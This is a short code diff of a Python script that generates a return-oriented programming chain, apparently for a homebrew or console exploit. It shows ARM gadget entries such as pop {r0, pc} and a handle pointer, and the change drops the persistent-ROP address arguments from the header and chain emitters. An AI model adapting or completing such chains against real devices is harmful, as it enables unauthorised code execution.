@@ -6,9 +6,9 @@
 from constants import *
 from rop_generator import *
 
-emit_hdr(PERSISTENT_ROP_START)
+emit_hdr()
 
-emit_rop(PERSISTENT_ROP_START, PERSISTENT_ROP_END, PERSISTENT_ROP_SAFE, [
+emit_rop([
     GADGET_R0,                  # pop {r0, pc}
         RelativeAddr(22*4),        # handle_out_ptr
     GADGET_R1R2R3R4R5,          # pop {r1-r5, pc}
